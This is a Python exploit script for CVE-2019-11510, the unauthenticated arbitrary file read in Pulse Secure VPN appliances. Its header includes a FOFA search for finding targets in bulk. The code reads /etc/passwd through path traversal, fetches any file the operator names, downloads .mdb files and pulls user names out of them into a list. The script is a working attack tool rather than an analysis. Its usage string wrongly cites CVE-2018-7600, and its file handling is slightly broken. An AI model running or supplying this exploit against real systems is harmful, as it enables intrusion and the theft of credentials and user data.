'''
CVE-2019-11510 Pulse Secure 任意文件读取漏洞
writen by ophxc
批量检测方式：fofa：body="/dana-na/"
漏洞描述：在Pulse Secure公司的Pulse Connect Secure (PCS) SSL VPN产品中存在一个任意文件读取漏洞，攻击者无需认证即可读取任意文件。
'''
import requests
import argparse
import os
import sys
from urllib.parse import urlparse, urljoin

def exp(url,filename):
    netloc = urlparse(url)[1]
    path = urlparse(url)[2]
    if path == '/':
        url = url
    elif path == '':
        url = url + '/'
    else:
        print("URL Error")
        return
    res = requests.get(
        url + 'data-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/',
        verify=False)
    print("Now checking it's vulnable\n")
    if res.status_code == 200 and 'root:x:0:0:root' in res.text :
        print("it seems vulnerable\n")
        print("Now reading :" + filename)
        r = requests.get(
            url + 'data-na/../dana/html5acc/guacamole/../../../../../../..'+filename+'?/dana/html5acc/guacamole/',
            verify=False)
        if r.status_code == 200 and ".mdb" not in filename:
            print('Reading' +filename)
            print(r.text)
            f = open(filename+".html", 'a')
            f.write(r.text + "\n")
            f.close()
        if ".mdb" in filename:
            print('Downloading '+filename)
            r = requests.get(
            url + 'data-na/../dana/html5acc/guacamole/../../../../../../..'+filename+'?/dana/html5acc/guacamole/',
            verify=False)
            if r.status_code == 200:
                f = open(netloc + filename, 'ab')
                f.write(r.content)
                f.close()

                f = open(filename, 'rb')
                users = []
                buf = f.readline()
                while buf:
                    n = buf.count(b'CN=')
                    if n > 0:
                        for i in range(n):
                            if i:
                                indexx = buf.find(b'CN=', indexx + 1)
                            else:
                                indexx = buf.find(b'CN=')
                                t = buf[indexx:indexx + 100]
                                end = t.find(b'\x00')
                                t = buf[indexx:indexx + end]
                                users.append(t.decode())
                    buf = f.readline()
                f.close()
                users = list(set(users))
                f = open(netloc + "/users.txt", "a")
                for line in users:
                    f.write(line + "\n")
                f.close()
    else:
        print(url + " ---------------> Not Vulnerable")


def main():
    parser = argparse.ArgumentParser(description="usage of CVE-2018-7600")
    parser.add_argument("-u", "--url", help="the target url", required=True)
    parser.add_argument("-f","--filename",help="the file you want to read",required=True)
    args = parser.parse_args()
    url= args.url
    filename=args.filename
    exp(url,filename)

if __name__ == '__main__':
    main()